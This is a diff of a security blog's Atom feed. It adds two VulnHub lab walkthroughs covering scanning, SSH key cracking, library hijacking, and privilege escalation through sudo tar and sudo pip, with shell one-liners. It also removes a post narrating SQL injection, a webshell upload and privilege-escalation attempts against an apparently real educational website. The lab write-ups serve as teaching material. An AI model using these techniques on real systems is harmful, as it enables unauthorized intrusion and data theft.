@@ -6,7 +6,7 @@
   <link href="https://syst1m.top/atom.xml" rel="self"/>
   
   <link href="https://syst1m.top/"/>
-  <updated>2022-06-21T12:30:05.188Z</updated>
+  <updated>2022-06-22T08:53:22.425Z</updated>
   <id>https://syst1m.top/</id>
   
   <author>
@@ -17,11 +17,30 @@
   <generator uri="https://hexo.io/">Hexo</generator>
   
   <entry>
-    <title>vulnhub-Empire打靶</title>
+    <title>vulnhub-EmpireBreakout</title>
+    <link href="https://syst1m.top/2022/06/22/vulnhub-breakout%E6%89%93%E9%9D%B6/"/>
+    <id>https://syst1m.top/2022/06/22/vulnhub-breakout%E6%89%93%E9%9D%B6/</id>
+    <published>2022-06-22T07:40:10.000Z</published>
+    <updated>2022-06-22T08:53:22.425Z</updated>
+    
+    <content type="html"><![CDATA[<h1 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h1><p>vulnhub项目  <a href="https://www.vulnhub.com/entry/empire-breakout,751/">https://www.vulnhub.com/entry/empire-breakout,751/</a><br>靶机:172.16.17.152<br>攻击机kali:172.16.17.140</p><h1 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h1><p>使用nmap对靶机进行扫描 开启了三个web服务,和2个smb服务<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206221547410.png"></p><p>445高危端口,尝试exp打445端口,失败,继续往下看80端口<br>apache,在前端源码里找到提示和加密密文<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206221606870.png"></p><p>挨个尝试解密,最后为Brainfuck加密,解出明文为 .2uqPEfj3D&lt;P’a-3 应该是某个账号的密码<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206221609231.png"></p><p>挨个访问10000&#x2F;20000端口,都是登录页面,没有利用的点<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206221612140.png"></p><h2 id="smb嗅探"><a href="#smb嗅探" class="headerlink" title="smb嗅探"></a>smb嗅探</h2><p>想到smb服务还没有利用到,回过头继续看smb服务<br>enum4linux 对靶机进行嗅探,爆出了一个用户名 cyber</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">enum.exe的Linux替代软件，用于枚举Windows和Samba主机中的数据。</span><br><span class="line">enum4linux 172.16.17.152</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202206221615489.png"></p><h1 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h1><h2 id="登录"><a href="#登录" class="headerlink" title="登录"></a>登录</h2><p>登录成功,发现有个地方可以直接执行命令<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206221619772.png"></p><p>反弹shell<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206221622849.png"><br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206221622106.png"></p><h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>查看root权限执行的命令,和文件,没有sudo命令,没有利用的点<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206221627684.png"></p><p>拿到第一个flag和一个root权限的 tar命令<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206221630268.png"></p><p>既然有tar,那么就要用到压缩 解压去提权,最后在&#x2F;var&#x2F;backups下翻到一个密码备份文件<br>对密码的备份文件进行压缩，然后解压即可么访问拿到密码</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">./tar -czvf test.tar.gz /var/backups/.old_pass.bak</span><br><span class="line">tar -xzvf test.tar.gz</span><br><span class="line"><span class="built_in">cat</span> var/backups/.old_pass.bak</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202206221650882.png"></p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202206221649498.png"></p>]]></content>
+    
+    
+    <summary type="html">&lt;h1 id=&quot;环境&quot;&gt;&lt;a href=&quot;#环境&quot; class=&quot;headerlink&quot; title=&quot;环境&quot;&gt;&lt;/a&gt;环境&lt;/h1&gt;&lt;p&gt;vulnhub项目  &lt;a href=&quot;https://www.vulnhub.com/entry/empire-breakout,751/&quot;&gt;https://www.vulnhub.com/entry/empire-breakout,751/&lt;/a&gt;&lt;br&gt;靶机:172.16.17.152&lt;br&gt;攻击机kali:172.16.17.140&lt;/p&gt;
+&lt;h1 id=&quot;信息收集&quot;&gt;&lt;a href=&quot;#信息收集&quot; class=&quot;headerlink&quot; title=&quot;信息收集&quot;&gt;&lt;/a&gt;信息收集&lt;/h1&gt;&lt;p&gt;使用nmap对靶机进行扫描 开启了三个web服务,和2个smb服务&lt;br&gt;&lt;img src=&quot;https://raw.githubusercontent.com/chencicici/images/main/202206221547410.png&quot;&gt;&lt;/p&gt;
+&lt;p&gt;445高危端口,尝试exp打445端口,失败,继续往下看80端口&lt;br&gt;apache,在前端源码里找到提示和加密密文&lt;br&gt;&lt;img src=&quot;https://raw.githubusercontent.com/chencicici/images/main/202206221606870.png&quot;&gt;&lt;/p&gt;</summary>
+    
+    
+    
+    
+  </entry>
+  
+  <entry>
+    <title>vulnhub-EmpireLupinOne打靶</title>
     <link href="https://syst1m.top/2022/06/21/vulnhub-Empire%E6%89%93%E9%9D%B6/"/>
     <id>https://syst1m.top/2022/06/21/vulnhub-Empire%E6%89%93%E9%9D%B6/</id>
     <published>2022-06-21T10:10:30.000Z</published>
-    <updated>2022-06-21T12:30:05.188Z</updated>
+    <updated>2022-06-22T07:50:01.542Z</updated>
     
     <content type="html"><![CDATA[<h1 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h1><p>vulnhub项目 <a href="https://www.vulnhub.com/series/empire,507/">https://www.vulnhub.com/series/empire,507/</a><br>靶机:172.16.17.151<br>攻击机kali:172.16.17.140</p><h1 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h1><p>nmap扫描确定靶机ip,再详细扫描<br>开放了22和80,扫出一个&#x2F;~myfiles目录<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206211837023.png"></p><p>访问看看,提示404,暗示我们继续尝试当前目录<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206211838965.png"></p><h2 id="fuzz"><a href="#fuzz" class="headerlink" title="fuzz"></a>fuzz</h2><p>wfuzz继续扫当前目录</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wfuzz -c -w /usr/share/wfuzz/wordlist/general/common.txt --hc 404 http://172.16.17.151/~FUZZ</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202206211859278.png"></p><p>提示我们icex64用户有ssh秘钥,并使用fasttrack去爆破<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206211901501.png"></p><p>继续爆破,扫出一个文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wfuzz -c -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt --hc 404,403 -u http://172.16.17.151/~secret/.FUZZ.txt</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202206211916638.png"></p><p>但是应该是加密过的,不是ssh密钥<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206211917480.png"></p><p>拿去解密,挨个尝试后,以base58解出秘钥<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206211922436.png"></p><h1 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h1><h2 id="爆破秘钥"><a href="#爆破秘钥" class="headerlink" title="爆破秘钥"></a>爆破秘钥</h2><p>使用ssh2john将秘钥编译一下,再使用john暴力破解,解出密码 P@55w0rd!</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ssh2john key.txt &gt; passkey.txt</span><br><span class="line">                                                                                                                                                                                                              </span><br><span class="line">john --wordlist=/usr/share/wordlists/fasttrack.txt passkey.txt</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202206211929056.png"></p><h2 id="尝试登录"><a href="#尝试登录" class="headerlink" title="尝试登录"></a>尝试登录</h2><p>直接登录被拒绝<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206211932835.png"></p><p>利用秘钥再次登录,此处要注意,先将秘钥权限改为 600<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206211938634.png"></p><h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>在家目录下看到一个user.txt,拿到第一个flag<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206211946639.png"></p><p>查看root权限运行的文件,没有写入权限,继续往下看<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206211941860.png"></p><p>发现使用webbrowser包,跟进看看<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206211952250.png"></p><p>是root权限<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206211953957.png"></p><p>写入shell<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206212014187.png"></p><p>运行heist.py反弹shell<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206212015303.png"></p><p>查看arsene用户下以root权限运行的命令或文件,发现pip不需要密码就可以执行<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206212016681.png"></p><p>google pip提权 找到方法</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">arsene@LupinOne:~$ TF=$(<span class="built_in">mktemp</span> -d)</span><br><span class="line">arsene@LupinOne:~$ <span class="built_in">echo</span> <span class="string">&quot;import os; os.execl(&#x27;/bin/sh&#x27;, &#x27;sh&#x27;, &#x27;-c&#x27;, &#x27;sh &lt;<span class="subst">$(tty)</span> &gt;<span class="subst">$(tty)</span> 2&gt;<span class="subst">$(tty)</span>&#x27;)&quot;</span> &gt; <span class="variable">$TF</span>/setup.py</span><br><span class="line">arsene@LupinOne:~$ sudo pip install <span class="variable">$TF</span></span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202206212029257.png"></p>]]></content>
     
@@ -32,6 +51,12 @@
     
     
     
+    <category term="打靶" scheme="https://syst1m.top/categories/%E6%89%93%E9%9D%B6/"/>
+    
+    
+    <category term="vulnhub" scheme="https://syst1m.top/tags/vulnhub/"/>
+    
+    <category term="ssh" scheme="https://syst1m.top/tags/ssh/"/>
     
   </entry>
   
@@ -407,9 +432,9 @@
     <category term="打靶" scheme="https://syst1m.top/categories/%E6%89%93%E9%9D%B6/"/>
     
     
-    <category term="XXE" scheme="https://syst1m.top/tags/XXE/"/>
-    
     <category term="vulnhub" scheme="https://syst1m.top/tags/vulnhub/"/>
+    
+    <category term="XXE" scheme="https://syst1m.top/tags/XXE/"/>
     
   </entry>
   
@@ -497,33 +522,6 @@
     <category term="CTF" scheme="https://syst1m.top/tags/CTF/"/>
     
     <category term="反序列化" scheme="https://syst1m.top/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>报错注入getshell到提权</title>
-    <link href="https://syst1m.top/2022/05/29/%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5getshell%E5%88%B0%E6%8F%90%E6%9D%83/"/>
-    <id>https://syst1m.top/2022/05/29/%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5getshell%E5%88%B0%E6%8F%90%E6%9D%83/</id>
-    <published>2022-05-29T14:41:09.000Z</published>
-    <updated>2022-05-31T11:52:03.077Z</updated>
-    
-    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>梦到一个网站,然后getshell</p><h1 id="fuzz"><a href="#fuzz" class="headerlink" title="fuzz"></a>fuzz</h1><p>google插件识别到指纹,apache+php<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202205292244063.png"></p><p>扫了下目录,爆出绝对路径<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202205292246104.png"></p><p>看到php?tbsn&#x3D;xx,上fuzz大法,最后试出来报错注入<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202205292249932.png"></p><p>手工注入不行,直接丢sqlmap,站点是个edu数据多得很,断断续续跑了半天<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202205292254846.png"></p><p>弱密码yyds</p><p>直接登录,完全没有校验,直接传一句话getshell<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202205292257176.png"></p><p>权限很低</p><h1 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h1><p>脏牛提权,提不动,原因暂时不知道<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202205292319343.png"></p>]]></content>
-    
-    
-    <summary type="html">&lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;梦到一个网站,然后getshell&lt;/p&gt;
-&lt;h1 id=&quot;fuzz&quot;&gt;&lt;a href=&quot;#fuzz&quot; class=&quot;headerlink&quot; title=&quot;fuzz&quot;&gt;&lt;/a&gt;fuzz&lt;/h1&gt;&lt;p&gt;google插件识别到指纹,apache+php&lt;br&gt;&lt;img src=&quot;https://raw.githubusercontent.com/chencicici/images/main/202205292244063.png&quot;&gt;&lt;/p&gt;
-&lt;p&gt;扫了下目录,爆出绝对路径&lt;br&gt;&lt;img src=&quot;https://raw.githubusercontent.com/chencicici/images/main/202205292246104.png&quot;&gt;&lt;/p&gt;</summary>
-    
-    
-    
-    <category term="渗透实战" scheme="https://syst1m.top/categories/%E6%B8%97%E9%80%8F%E5%AE%9E%E6%88%98/"/>
-    
-    
-    <category term="sql注入" scheme="https://syst1m.top/tags/sql%E6%B3%A8%E5%85%A5/"/>
-    
-    <category term="提权" scheme="https://syst1m.top/tags/%E6%8F%90%E6%9D%83/"/>
-    
-    <category term="getshell" scheme="https://syst1m.top/tags/getshell/"/>
     
   </entry>
   
